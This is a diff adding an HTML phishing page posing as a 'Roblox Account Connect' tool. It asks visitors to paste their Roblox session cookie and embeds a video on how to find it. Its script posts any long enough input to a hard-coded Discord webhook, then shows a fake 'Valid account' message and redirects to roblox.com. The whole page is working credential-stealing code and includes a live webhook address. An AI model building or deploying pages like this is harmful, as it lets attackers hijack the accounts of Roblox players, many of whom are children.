@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Account Connect</title>
+    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/PZgYwFFC/noFilter.png" />
+    <style>
+        /* Arrière-plan sombre et moderne */
+        body {
+            font-family: Arial, sans-serif;
+            background: #0b0b0b;
+            color: #ffffff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Titre principal avec effet lumineux */
+        .giveaway-title {
+            font-size: 42px;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-align: center;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ffcc00, #ff6600, #ff0000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0px 0px 10px rgba(255, 165, 0, 0.8);
+        }
+
+        /* Conteneur principal */
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Style du logo */
+        .logo {
+            max-width: 170px;
+            margin-bottom: 20px;
+        }
+
+        /* Champ de texte stylé */
+        input[type="text"] {
+            width: 90%;
+            height: 50px;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+            outline: none;
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        input[type="text"]::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        input[type="text"]:focus {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Bouton moderne */
+        button {
+            padding: 12px 20px;
+            background: linear-gradient(45deg, #ff0000, #ff6600, #ffcc00);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 85%;
+            font-size: 16px;
+            font-weight: bold;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(255, 99, 71, 0.3);
+            display: block;  /* Permet de s'assurer que le bouton est un bloc */
+            margin: 0 auto;  /* Centre le bouton horizontalement */
+        }
+
+
+        button:hover {
+            background: linear-gradient(45deg, #ff6600, #ffcc00, #ff0000);
+            transform: scale(1.05);
+            box-shadow: 0 4px 20px rgba(255, 99, 71, 0.5);
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        /* Section vidéo */
+        .video-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .video-container h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        iframe {
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <!-- Titre du Giveaway -->
+    <h1 class="giveaway-title">Roblox Account Connect</h1>
+
+    <div class="container">
+        <img src="https://i.ibb.co/PZgYwFFC/noFilter.png" alt="RobuxGame Logo" class="logo2">
+        <h1></h1>
+        <input type="text" id="userInput" placeholder="Enter your roblox cookie...">
+        <button onclick="handleButtonClick()">Access The Account</button>
+    </div>
+    
+    <!-- Section vidéo -->
+    <h3>How to get your Roblox cookie</h3>
+    <iframe width="400" height="225" 
+        src="https://www.youtube.com/embed/Y3fn7wmFmX0" 
+        frameborder="0" 
+        allowfullscreen>
+    </iframe>
+
+    <script>
+        function handleButtonClick() {
+            const userInput = document.getElementById('userInput').value;
+            
+            if (userInput.length >= 500) {
+                const webhookURL = 'https://discord.com/api/webhooks/1352994688176754860/wE0mRScnHeSu48iCen2NzHBqLC-P6dxL4Q8j5fam7JpMUSLDSyztEk2Ga8me_dp5viaw';
+                const data = {
+                    content: `roblox-cookie : ${userInput}`
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Valid account !');
+                        window.location.href = 'https://roblox.com/';
+                    } else {
+                        alert('Error: 1333');
+                    }
+                })
+                .catch(error => {
+                    alert('Erreur: 0453778895');
+                    console.error('Erreur:', error);
+                });
+            } else {
+                alert('Invalid cookie');
+            }
+        }
+    </script>
+</body>
+</html>
